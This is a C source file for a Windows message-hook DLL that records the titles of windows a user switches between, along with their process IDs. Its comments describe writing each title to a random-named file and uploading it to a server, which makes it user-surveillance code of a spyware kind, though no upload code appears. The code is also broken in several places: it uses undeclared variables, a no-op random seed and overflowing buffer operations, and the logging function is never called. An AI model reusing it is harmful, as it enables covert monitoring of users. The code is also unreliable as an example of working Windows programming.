#include <Windows.h>
#define PTHOOK_EXPORTS _declspec(dllexport)
#include "WinHook.h"
#include <stdio.h>
#include <time.h>
//max characters to include in title bar buffer
#define MAX_BUFFER_SIZE 200

BOOL logToFile(LPTSTR);
VOID generateRandomStr(char*);

/*Callback Function: CallWndProc 
  Get title bar caption from the Window currently activated
  and write to random named text file...upload to server in thread
*/
LRESULT CALLBACK GetMsgProc(int code, WPARAM wParam, LPARAM lParam) {
	LPTSTR szWincapText = (LPTSTR) malloc(MAX_BUFFER_SIZE);
	if (code < 0) {
		return CallNextHookEx(NULL, code, wParam, lParam);
	}
	if (code == HC_ACTION) {
		CWPSTRUCT* cwps = (CWPSTRUCT*)lParam;
		if ((cwps->message == WM_ACTIVATE) && (LOWORD(cwps->wParam) == WA_INACTIVE)) {
				HWND hActivatedWindow = (*cwps).hwnd; // dereference pointer and get handle to window being activated
				if (GetWindowText(hActivatedWindow, szWincapText, MAX_BUFFER_SIZE) != 0) {
					if (hActivatedWindow == NULL) { return 0; }

					Beep(3000, 400);
					DWORD pProcId = 0;
					GetWindowThreadProcessId(hActivatedWindow,&pProcId);
					wchar_t buffer[256];
					wsprintf(buffer, L"%lu:%s",pProcId, szWincapText);
					OutputDebugString(buffer);
				}
				return 0;
		}
	}
	return CallNextHookEx(NULL, code, wParam, lParam);
}
/*Create random-named file and write string (caption text in parameter)*/
BOOL logToFile(LPTSTR szWinCaption) {
	char dir [] = "C:\\Users\\Public\\tester\\";
	char fileName[10] = "";
	generateRandomStr(fileName); //get generated file name
	strncat_s(dir,strlen(dir),fileName,36);
	snprintf(dir,strlen(dir), "%s%s.txt", dir, fileName);
	HANDLE fHandle = CreateFile((LPTSTR)dir,GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	//format text and write to file
	snprintf(captionText, MAX_BUFFER_SIZE, "Window Title: %s",winCaption);
	WriteFile(fHandle, szWinCaption,MAX_BUFFER_SIZE,NULL,NULL);
	CloseHandle(fHandle);
	return TRUE;
}


/*Generate a log file name for the process */
VOID generateRandomStr(char holder []) {
	OutputDebugString(L"Inside string generator");
	size_t i = 0;
	(time(NULL)); //seed random number generator using system clock seconds
	while (i < 9) {
		int x = (97 + rand() % 97);
		if (x > 96 && x < 122) {
			holder[i] = ((char)x);
			i++;
		}
	}
	holder[i++] = '\0'; //terminate the string
}



